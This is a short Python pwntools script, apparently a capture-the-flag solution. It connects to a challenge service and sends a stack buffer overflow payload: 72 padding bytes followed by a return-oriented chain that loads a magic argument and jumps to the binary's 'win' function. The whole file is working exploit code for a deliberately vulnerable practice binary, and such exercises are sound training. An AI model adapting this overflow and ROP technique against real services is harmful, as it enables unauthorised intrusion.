from pwn import *

context.binary = elf = ELF("./main", checksec=False)
p = remote(args.HOST or "localhost", int(args.PORT or 1355))
payload = flat(b"A" * 72, elf.sym.pop_rdi_ret, 0x1337c0decafebabe, elf.sym.win)
p.sendlineafter(b"Your argument: ", payload)
print(p.recvall().decode())
